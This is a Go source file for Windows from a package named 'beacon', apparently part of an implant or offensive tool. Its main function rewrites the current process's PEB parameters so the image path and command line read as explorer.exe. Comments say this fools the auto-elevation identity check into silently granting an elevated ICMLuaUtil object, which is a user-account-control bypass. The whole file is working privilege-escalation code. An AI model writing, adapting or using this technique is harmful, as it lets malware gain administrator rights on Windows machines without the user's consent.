//go:build windows

package beacon

import (
	"syscall"
	"unsafe"
)

//go:noescape
func currentTeb() unsafe.Pointer

// rtlUserProcessParameters mirrors the RTL_USER_PROCESS_PARAMETERS layout
// (x64): ImagePathName lands at 0x60 and CommandLine at 0x70.
type rtlUserProcessParameters struct {
	MaximumLength uint32
	Length        uint32
	Flags         uint32
	DebugFlags    uint32
	ConsoleHandle uintptr
	ConsoleFlags  uint32
	_             uint32
	StdInput      uintptr
	StdOutput     uintptr
	StdError      uintptr
	CurrentDir    [0x18]byte
	DllPath       unicodeString
	ImagePathName unicodeString
	CommandLine   unicodeString
}

type unicodeString struct {
	Length     uint16
	MaximumLen uint16
	_          uint32
	Buffer     unsafe.Pointer
}

// masqueradeExplorer rewrites the current process's PEB process parameters
// so the image path and command line read as C:\Windows\explorer.exe. This
// satisfies the caller-identity check the 25H2 auto-elevation path performs
// before silently handing out an elevated ICMLuaUtil. The returned func
// restores the original strings.
//
//go:nocheckptr
func masqueradeExplorer() (func(), error) {
	teb := currentTeb()
	if teb == nil {
		return nil, syscall.EINVAL
	}
	peb := *(*unsafe.Pointer)(unsafe.Add(teb, 0x60)) // TEB.ProcessEnvironmentBlock (x64)
	if peb == nil {
		return nil, syscall.EINVAL
	}
	pp := *(*unsafe.Pointer)(unsafe.Add(peb, 0x20)) // PEB.ProcessParameters (x64)
	if pp == nil {
		return nil, syscall.EINVAL
	}
	params := (*rtlUserProcessParameters)(pp)

	savedImage := params.ImagePathName
	savedCmd := params.CommandLine
	savedImageBuf := make([]byte, savedImage.Length)
	savedCmdBuf := make([]byte, savedCmd.Length)
	copy(savedImageBuf, (*[1 << 20]byte)(savedImage.Buffer)[:savedImage.Length])
	copy(savedCmdBuf, (*[1 << 20]byte)(savedCmd.Buffer)[:savedCmd.Length])

	img := syscall.StringToUTF16(`C:\Windows\explorer.exe`)
	cmd := syscall.StringToUTF16(`C:\Windows\explorer.exe`)
	if err := writeUnicodeString(&params.ImagePathName, img); err != nil {
		return nil, err
	}
	if err := writeUnicodeString(&params.CommandLine, cmd); err != nil {
		restoreUnicode(&params.ImagePathName, savedImage, savedImageBuf)
		return nil, err
	}

	return func() {
		restoreUnicode(&params.ImagePathName, savedImage, savedImageBuf)
		restoreUnicode(&params.CommandLine, savedCmd, savedCmdBuf)
	}, nil
}

// restoreUnicode puts the original Length and buffer bytes back.
func restoreUnicode(dst *unicodeString, saved unicodeString, savedBuf []byte) {
	copy((*[1 << 20]byte)(dst.Buffer)[:saved.Length], savedBuf)
	dst.Length = saved.Length
}

// writeUnicodeString copies src into the existing Buffer of dst, resizing the
// Length to exclude the NUL terminator (the Buffer is large enough for the
// process's original parameters).
func writeUnicodeString(dst *unicodeString, src []uint16) error {
	n := (len(src) - 1) * 2
	if uint16(n) > dst.MaximumLen {
		return syscall.EINVAL
	}
	buf := (*[1 << 20]uint16)(dst.Buffer)
	copy(buf[:len(src)], src)
	dst.Length = uint16(n)
	return nil
}
